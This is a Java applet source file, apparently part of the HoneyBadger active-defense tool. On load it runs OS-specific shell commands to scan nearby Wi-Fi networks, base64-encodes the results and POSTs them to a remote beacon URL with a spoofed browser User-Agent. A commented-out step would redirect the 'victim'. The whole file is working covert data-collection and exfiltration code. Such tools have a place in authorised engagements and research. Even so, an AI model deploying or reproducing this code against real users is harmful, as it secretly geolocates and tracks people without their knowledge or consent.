import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.HttpURLConnection;

public class Java extends Applet {
  private Object initialized = null;
  public Object isInitialized()
  {
    return initialized;
  }

  public void init()
  {
    Runtime rt;
    String[] command;
    String sanitizedOs;
    Process proc;

    try {
      rt = Runtime.getRuntime();
      // determine host operating system
      String os = System.getProperty("os.name").toLowerCase();
      if(os.indexOf( "win" ) >= 0) // we're running windows
      {
        command = new String[]{"cmd.exe", "/c", "netsh", "wlan", "show", "networks", "mode=bssid", "|", "findstr", "\"SSID Signal Channel\""};
        sanitizedOs = "windows";
      }
      else if(os.indexOf("mac") >= 0) // mac
      {
        command = new String[]{"/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"};
        sanitizedOs = "mac os x";
      }
      else if(os.indexOf("nix") >=0 || os.indexOf("nux") >=0) // unix
      {
        command = new String[]{"/bin/sh", "-c", "iwlist", "scan", "|", "egrep", "'Address|ESSID|Signal'"};
        sanitizedOs = "linux";
      }
      else {
        // define an empty command to avoid compiler errors
        command = new String[1];
        sanitizedOs = "";
        System.exit(0);
      }

      proc = rt.exec(command);
      proc.waitFor();

      BufferedReader stdInput = new BufferedReader(new
          InputStreamReader(proc.getInputStream()));

      String s = null;
      StringBuilder sb = new StringBuilder();
      while ((s = stdInput.readLine()) != null) {
        sb.append(s);
        sb.append("\n");
      }
      String postData = sb.toString();
      System.out.println(postData);

      String honeyBadgerUrlBase = getParameter("1");
      String guid = getParameter("2");
      // os can be one of ["mac os x", "windows", "linux"]
      // data is b64 encoded
      // Base64 class is new in Java 8, released in 2014 - no back compat
      String data = Base64.getEncoder().encodeToString(postData.getBytes());
      String postParams = String.join("", "os=", sanitizedOs, "&data=", new String(data));
      System.out.println(postParams);

      String honeyBadgerUrl = String.join("", honeyBadgerUrlBase, "/api/beacon/", guid, "/java-applet");
      System.out.println(honeyBadgerUrl);
      // send the data to HoneyBadger
      URL url = new URL(honeyBadgerUrl);
      // Open the conneciton
      URLConnection con = url.openConnection();
      HttpURLConnection http = (HttpURLConnection)con;
      http.setRequestMethod("POST");
      http.setDoOutput(true);
      int length = postParams.getBytes().length;
      http.setFixedLengthStreamingMode(length);
      http.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
      // TODO make this different based on OS
      http.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2");
      http.connect();
      // close it
      OutputStream out = http.getOutputStream();
      out.write(postParams.getBytes());
      out.flush();
      out.close();
      System.out.println("Done.");
    }
    catch (Exception exception)
    {
      exception.printStackTrace();
    }
  }
}
// TODO redirect victim to new page
        // String page = getParameter( "3" );
        // if ( page != null && page.length() > 0 )
        // {
        //     URL urlPage = new URL(page);
        //     getAppletContext().showDocument(urlPage);
        // }
